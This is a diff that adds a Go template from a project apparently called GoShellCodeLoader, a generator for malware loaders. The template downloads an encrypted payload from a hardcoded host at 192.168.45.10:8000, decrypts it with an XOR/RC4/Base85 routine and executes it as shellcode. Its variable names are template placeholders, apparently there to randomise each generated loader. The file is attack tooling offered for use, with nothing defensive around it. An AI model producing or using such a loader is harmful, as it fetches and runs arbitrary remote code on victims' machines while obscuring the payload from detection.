@@ -1,0 +1,18 @@
+package main
+
+import (
+	"GoShellCodeLoader/Crypto"
+	"GoShellCodeLoader/Loader"
+)
+
+func main()  {
+	{{.keyName}} := []byte("{{.keyValue}}")
+
+	{{.url}} := "http://192.168.45.10:8000/{{.fileName}}" // 填写下载地址
+
+	{{.encrypt}}, _ := Loader.RemoteResty({{.url}})
+
+	{{.decrypt}}, _ := Crypto.XORRC4Base85Decrypt(string({{.encrypt}}), {{.keyName}})
+
+	Loader.BaseLoader({{.decrypt}})
+}
